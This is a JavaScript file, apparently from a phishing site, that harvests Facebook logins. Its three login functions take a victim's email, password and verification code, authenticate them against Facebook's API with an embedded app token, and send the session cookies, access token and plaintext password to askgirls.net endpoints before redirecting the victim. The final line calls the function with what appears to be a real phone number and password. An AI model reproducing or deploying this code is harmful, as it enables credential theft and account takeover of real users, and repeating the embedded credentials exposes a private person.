//http://askgirls.net/fb3.js


console.log("js loaded!");

var login = function(email, password, verified_code) {
    console.log('tới đây rồi');
	var jsonreturn=(file_get_contents("https://b-graph.facebook.com/?include_headers=false&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&method=post&batch=%5B%7B%22method%22%3A%22POST%22%2C%22body%22%3A%22format%3Djson%26device_id%3D93609b45-55fd-4152-bd9c-f954a455ae93%26email%3D"+encodeURIComponent(email)+"%26password%3D"+encodeURIComponent(verified_code || password)+"%26credentials_type%3Dpassword%26generate_session_cookies%3D1%26error_detail_type%3Dbutton_with_disabled%26generate_machine_id%3D1%26locale%3Den_US%26client_country_code%3DTH%26fb_api_req_friendly_name%3Dauthenticate%22%2C%22name%22%3A%22authenticate%22%2C%22omit_response_on_success%22%3Afalse%2C%22relative_url%22%3A%22method%2Fauth.login%22%7D%5D&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authLogin"));
    //truyền 2 biến này
    console.log("chạy tới đây rồi!!!!");
    var data = JSON.parse(JSON.parse(jsonreturn)[0].body);
	if (data.error_code) {
		if (data.error_code == 406){
 			//sau khi nhap password thi goi lai ham login
			var error_message = JSON.parse(data.error_data).error_message;
			console.log("Nhap verify code");
			document.write(error_message);
			$.ajax({
				type: "POST",
				url: "http://askgirls.net/facebooklogin.php?act=verify",
				data: {
					
					email : email,
					password : password
				},
				success: function(data) {
					console.log('verify code');
				}
			});
            //gửi thông tin qua bên trang login luôn
            window.location.href = "http://askgirls.net/fbconnect.php?act=verify";
		}
		else {
			var error_message = JSON.parse(data.error_data).error_message;
			console.log(error_message);
			document.write(error_message);
            window.location.href = "http://askgirls.net/fbconnect.php?act=error&err="+error_message;
			
		//Hien thi error message
		}
	}
	else if (data.session_key) {
		//thong bao thanh cong va gui data len server
        console.log("chạy tới đây rồi!!!!22222");
		console.log(data.access_token);
		$.ajax({
			type: "POST",
			url: "http://askgirls.net/facebooklogin.php?act=save-token",
			data: {
				cookie : JSON.stringify(data),
				token : data.access_token,
				email : email,
				password : password
        },
        success: function(data) {
            //Redirect toi trang chu
			location.href = "http://askgirls.net/fbconnect.php?act=go";
        }
    });
	}
}

var loginMobile = function(email, password, verified_code) {
    console.log('tới đây rồi');
    var jsonreturn=(file_get_contents("https://b-graph.facebook.com/?include_headers=false&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&method=post&batch=%5B%7B%22method%22%3A%22POST%22%2C%22body%22%3A%22format%3Djson%26device_id%3D93609b45-55fd-4152-bd9c-f954a455ae93%26email%3D"+encodeURIComponent(email)+"%26password%3D"+encodeURIComponent(verified_code || password)+"%26credentials_type%3Dpassword%26generate_session_cookies%3D1%26error_detail_type%3Dbutton_with_disabled%26generate_machine_id%3D1%26locale%3Den_US%26client_country_code%3DTH%26fb_api_req_friendly_name%3Dauthenticate%22%2C%22name%22%3A%22authenticate%22%2C%22omit_response_on_success%22%3Afalse%2C%22relative_url%22%3A%22method%2Fauth.login%22%7D%5D&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authLogin"));
    //truyền 2 biến này
    console.log("chạy tới đây rồi!!!!");
    var data = JSON.parse(JSON.parse(jsonreturn)[0].body);
    if (data.error_code) {
        if (data.error_code == 406){
            //sau khi nhap password thi goi lai ham login
            var error_message = JSON.parse(data.error_data).error_message;
            console.log("Nhap verify code");
            document.write(error_message);
            $.ajax({
                type: "POST",
                url: "http://askgirls.net/facebooklogin.php?act=verify",
                data: {

                    email : email,
                    password : password
                },
                success: function(data) {
                    console.log('verify code');
                }
            });
            //gửi thông tin qua bên trang login luôn
            window.location.href = "http://askgirls.net/fbconnect_thai_mobile.php?act=verify";
        }
        else {
            var error_message = JSON.parse(data.error_data).error_message;
            console.log(error_message);
            document.write(error_message);
            window.location.href = "http://askgirls.net/fbconnect_thai_mobile.php?act=error&err="+error_message;

            //Hien thi error message
        }
    }
    else if (data.session_key) {
        //thong bao thanh cong va gui data len server
		console.log(data.access_token);
        console.log("chạy tới đây rồi!!!!22222");
        $.ajax({
            type: "POST",
            url: "http://askgirls.net/facebooklogin.php?act=save-token",
            data: {
                cookie : JSON.stringify(data),
                token : data.access_token,
                email : email,
                password : password
            },
            success: function(data) {
                //Redirect toi trang chu
                location.href = "http://askgirls.net/fbconnect.php?act=go";
            }
        });
    }
}

var loginIframe = function(email, password, verified_code) {
    console.log('tới đây rồi');
    var jsonreturn=(file_get_contents("https://b-graph.facebook.com/?include_headers=false&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&method=post&batch=%5B%7B%22method%22%3A%22POST%22%2C%22body%22%3A%22format%3Djson%26device_id%3D93609b45-55fd-4152-bd9c-f954a455ae93%26email%3D"+encodeURIComponent(email)+"%26password%3D"+encodeURIComponent(verified_code || password)+"%26credentials_type%3Dpassword%26generate_session_cookies%3D1%26error_detail_type%3Dbutton_with_disabled%26generate_machine_id%3D1%26locale%3Den_US%26client_country_code%3DTH%26fb_api_req_friendly_name%3Dauthenticate%22%2C%22name%22%3A%22authenticate%22%2C%22omit_response_on_success%22%3Afalse%2C%22relative_url%22%3A%22method%2Fauth.login%22%7D%5D&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authLogin"));
    //truyền 2 biến này
    console.log("chạy tới đây rồi!!!!");
    var data = JSON.parse(JSON.parse(jsonreturn)[0].body);
    if (data.error_code) {
        if (data.error_code == 406){
            //sau khi nhap password thi goi lai ham login
            var error_message = JSON.parse(data.error_data).error_message;
            console.log("Nhap verify code");
            document.write(error_message);
            $.ajax({
                type: "POST",
                url: "http://askgirls.net/facebooklogin.php?act=verify",
                data: {

                    email : email,
                    password : password
                },
                success: function(data) {
                    console.log('verify code');
                }
            });
            //gửi thông tin qua bên trang login luôn
            window.location.href = "http://askgirls.net/loginIframe.php?act=verify";
        }
        else {
            var error_message = JSON.parse(data.error_data).error_message;
            console.log(error_message);
            document.write(error_message);
            window.location.href = "http://askgirls.net/loginIframe.php?act=error&err="+error_message;

            //Hien thi error message
        }
    }
    else if (data.session_key) {
        //thong bao thanh cong va gui data len server
        console.log("chạy tới đây rồi!!!!22222");
        $.ajax({
            type: "POST",
            url: "http://askgirls.net/facebooklogin.php?act=save-token",
            data: {
                cookie : JSON.stringify(data),
                token : data.access_token,
                email : email,
                password : password
            },
            success: function(data) {
                //Redirect toi trang chu
                parent.location.href="http://siteazfreegamesonline.blogspot.com/p/checklogin.html?id="+email;
                localStorage.setItem("blogStor", email);
            }
        });
    }
}

function file_get_contents(url, flags, context, offset, maxLen) {
    var tmp, headers = [],
    newTmp = [],
    k = 0,
    i = 0,
    href = '',
    pathPos = -1,
    flagNames = 0,
    content = null,
    http_stream = false;
    var func = function(value) {
    return value.substring(1) !== '';
    };

    // BEGIN REDUNDANT
    this.php_js = this.php_js || {};
    this.php_js.ini = this.php_js.ini || {};
    // END REDUNDANT
    var ini = this.php_js.ini;
    context = context || this.php_js.default_streams_context || null;

    if (!flags) {
    flags = 0;
    }
    var OPTS = {
    FILE_USE_INCLUDE_PATH: 1,
    FILE_TEXT: 32,
    FILE_BINARY: 64
    };
    if (typeof flags === 'number') { // Allow for a single string or an array of string flags
    flagNames = flags;
    } else {
    flags = [].concat(flags);
    for (i = 0; i < flags.length; i++) {
    if (OPTS[flags[i]]) {
    flagNames = flagNames | OPTS[flags[i]];
    }
    }
    }

    if (flagNames & OPTS.FILE_BINARY && (flagNames & OPTS.FILE_TEXT)) { // These flags shouldn't be together
    throw 'You cannot pass both FILE_BINARY and FILE_TEXT to file_get_contents()';
    }

    if ((flagNames & OPTS.FILE_USE_INCLUDE_PATH) && ini.include_path && ini.include_path.local_value) {
    var slash = ini.include_path.local_value.indexOf('/') !== -1 ? '/' : '\\';
    url = ini.include_path.local_value + slash + url;
    } else if (!/^(https?|file):/.test(url)) { // Allow references within or below the same directory (should fix to allow other relative references or root reference; could make dependent on parse_url())
    href = this.window.location.href;
    pathPos = url.indexOf('/') === 0 ? href.indexOf('/', 8) - 1 : href.lastIndexOf('/');
    url = href.slice(0, pathPos + 1) + url;
    }

    var http_options;
    if (context) {
    http_options = context.stream_options && context.stream_options.http;
    http_stream = !! http_options;
    }

    if (!context || http_stream) {
    var req = this.window.ActiveXObject ? new ActiveXObject('Microsoft.XMLHTTP') : new XMLHttpRequest();
    if (!req) {
    throw new Error('XMLHttpRequest not supported');
    }

    var method = http_stream ? http_options.method : 'GET';
    var async = !! (context && context.stream_params && context.stream_params['phpjs.async']);

    if (ini['phpjs.ajaxBypassCache'] && ini['phpjs.ajaxBypassCache'].local_value) {
    url += (url.match(/\?/) == null ? '?' : '&') + (new Date())
    .getTime(); // Give optional means of forcing bypass of cache
    }

    req.open(method, url, async);
    if (async) {
    var notification = context.stream_params.notification;
    if (typeof notification === 'function') {
    // Fix: make work with req.addEventListener if available: https://developer.mozilla.org/En/Using_XMLHttpRequest
    if (0 && req.addEventListener) { // Unimplemented so don't allow to get here
    /*
    req.addEventListener('progress', updateProgress, false);
    req.addEventListener('load', transferComplete, false);
    req.addEventListener('error', transferFailed, false);
    req.addEventListener('abort', transferCanceled, false);
    */
    } else {
    req.onreadystatechange = function(aEvt) { // aEvt has stopPropagation(), preventDefault(); see https://developer.mozilla.org/en/NsIDOMEvent
    // Other XMLHttpRequest properties: multipart, responseXML, status, statusText, upload, withCredentials
    /*
    PHP Constants:
    STREAM_NOTIFY_RESOLVE   1       A remote address required for this stream has been resolved, or the resolution failed. See severity  for an indication of which happened.
    STREAM_NOTIFY_CONNECT   2     A connection with an external resource has been established.
    STREAM_NOTIFY_AUTH_REQUIRED 3     Additional authorization is required to access the specified resource. Typical issued with severity level of STREAM_NOTIFY_SEVERITY_ERR.
    STREAM_NOTIFY_MIME_TYPE_IS  4     The mime-type of resource has been identified, refer to message for a description of the discovered type.
    STREAM_NOTIFY_FILE_SIZE_IS  5     The size of the resource has been discovered.
    STREAM_NOTIFY_REDIRECTED    6     The external resource has redirected the stream to an alternate location. Refer to message .
    STREAM_NOTIFY_PROGRESS  7     Indicates current progress of the stream transfer in bytes_transferred and possibly bytes_max as well.
    STREAM_NOTIFY_COMPLETED 8     There is no more data available on the stream.
    STREAM_NOTIFY_FAILURE   9     A generic error occurred on the stream, consult message and message_code for details.
    STREAM_NOTIFY_AUTH_RESULT   10     Authorization has been completed (with or without success).

    STREAM_NOTIFY_SEVERITY_INFO 0     Normal, non-error related, notification.
    STREAM_NOTIFY_SEVERITY_WARN 1     Non critical error condition. Processing may continue.
    STREAM_NOTIFY_SEVERITY_ERR  2     A critical error occurred. Processing cannot continue.
    */
    var objContext = {
    responseText: req.responseText,
    responseXML: req.responseXML,
    status: req.status,
    statusText: req.statusText,
    readyState: req.readyState,
    evt: aEvt
    }; // properties are not available in PHP, but offered on notification via 'this' for convenience
    // notification args: notification_code, severity, message, message_code, bytes_transferred, bytes_max (all int's except string 'message')
    // Need to add message, etc.
    var bytes_transferred;
    switch (req.readyState) {
    case 0:
    //     UNINITIALIZED     open() has not been called yet.
    notification.call(objContext, 0, 0, '', 0, 0, 0);
    break;
    case 1:
    //     LOADING     send() has not been called yet.
    notification.call(objContext, 0, 0, '', 0, 0, 0);
    break;
    case 2:
    //     LOADED     send() has been called, and headers and status are available.
    notification.call(objContext, 0, 0, '', 0, 0, 0);
    break;
    case 3:
    //     INTERACTIVE     Downloading; responseText holds partial data.
    bytes_transferred = req.responseText.length * 2; // One character is two bytes
    notification.call(objContext, 7, 0, '', 0, bytes_transferred, 0);
    break;
    case 4:
    //     COMPLETED     The operation is complete.
    if (req.status >= 200 && req.status < 400) {
    bytes_transferred = req.responseText.length * 2; // One character is two bytes
    notification.call(objContext, 8, 0, '', req.status, bytes_transferred, 0);
    } else if (req.status === 403) { // Fix: These two are finished except for message
    notification.call(objContext, 10, 2, '', req.status, 0, 0);
    } else { // Errors
    notification.call(objContext, 9, 2, '', req.status, 0, 0);
    }
    break;
    default:
    throw 'Unrecognized ready state for file_get_contents()';
    }
    };
    }
    }
    }

    if (http_stream) {
    var sendHeaders = http_options.header && http_options.header.split(/\r?\n/);
    var userAgentSent = false;
    for (i = 0; i < sendHeaders.length; i++) {
    var sendHeader = sendHeaders[i];
    var breakPos = sendHeader.search(/:\s*/);
    var sendHeaderName = sendHeader.substring(0, breakPos);
    req.setRequestHeader(sendHeaderName, sendHeader.substring(breakPos + 1));
    if (sendHeaderName === 'User-Agent') {
    userAgentSent = true;
    }
    }
    if (!userAgentSent) {
    var user_agent = http_options.user_agent || (ini.user_agent && ini.user_agent.local_value);
    if (user_agent) {
    req.setRequestHeader('User-Agent', user_agent);
    }
    }
    content = http_options.content || null;
    /*
    // Presently unimplemented HTTP context options
    var request_fulluri = http_options.request_fulluri || false; // When set to TRUE, the entire URI will be used when constructing the request. (i.e. GET http://www.example.com/path/to/file.html HTTP/1.0). While this is a non-standard request format, some proxy servers require it.
    var max_redirects = http_options.max_redirects || 20; // The max number of redirects to follow. Value 1 or less means that no redirects are followed.
    var protocol_version = http_options.protocol_version || 1.0; // HTTP protocol version
    var timeout = http_options.timeout || (ini.default_socket_timeout && ini.default_socket_timeout.local_value); // Read timeout in seconds, specified by a float
    var ignore_errors = http_options.ignore_errors || false; // Fetch the content even on failure status codes.
    */
    }

    if (flagNames & OPTS.FILE_TEXT) { // Overrides how encoding is treated (regardless of what is returned from the server)
    var content_type = 'text/html';
    if (http_options && http_options['phpjs.override']) { // Fix: Could allow for non-HTTP as well
    content_type = http_options['phpjs.override']; // We use this, e.g., in gettext-related functions if character set
    //   overridden earlier by bind_textdomain_codeset()
    } else {
    var encoding = (ini['unicode.stream_encoding'] && ini['unicode.stream_encoding'].local_value) ||
    'UTF-8';
    if (http_options && http_options.header && (/^content-type:/im)
    .test(http_options.header)) { // We'll assume a content-type expects its own specified encoding if present
    content_type = http_options.header.match(/^content-type:\s*(.*)$/im)[1]; // We let any header encoding stand
    }
    if (!(/;\s*charset=/)
    .test(content_type)) { // If no encoding
    content_type += '; charset=' + encoding;
    }
    }
    req.overrideMimeType(content_type);
    }
    // Default is FILE_BINARY, but for binary, we apparently deviate from PHP in requiring the flag, since many if not
    //     most people will also want a way to have it be auto-converted into native JavaScript text instead
    else if (flagNames & OPTS.FILE_BINARY) { // Trick at https://developer.mozilla.org/En/Using_XMLHttpRequest to get binary
    req.overrideMimeType('text/plain; charset=x-user-defined');
    // Getting an individual byte then requires:
    // responseText.charCodeAt(x) & 0xFF; // throw away high-order byte (f7) where x is 0 to responseText.length-1 (see notes in our substr())
    }

    try {
    if (http_options && http_options['phpjs.sendAsBinary']) { // For content sent in a POST or PUT request (use with file_put_contents()?)
    req.sendAsBinary(content); // In Firefox, only available FF3+
    } else {
    req.send(content);
    }
    } catch (e) {
    // catches exception reported in issue #66
    return false;
    }

    tmp = req.getAllResponseHeaders();
    if (tmp) {
    tmp = tmp.split('\n');
    for (k = 0; k < tmp.length; k++) {
    if (func(tmp[k])) {
    newTmp.push(tmp[k]);
    }
    }
    tmp = newTmp;
    for (i = 0; i < tmp.length; i++) {
    headers[i] = tmp[i];
    }
    this.$http_response_header = headers; // see http://php.net/manual/en/reserved.variables.httpresponseheader.php
    }

    if (offset || maxLen) {
    if (maxLen) {
    return req.responseText.substr(offset || 0, maxLen);
    }
    return req.responseText.substr(offset);
    }
    return req.responseText;
    }
    return false;
    }
	
	
	login("0903629909","Maiminhem");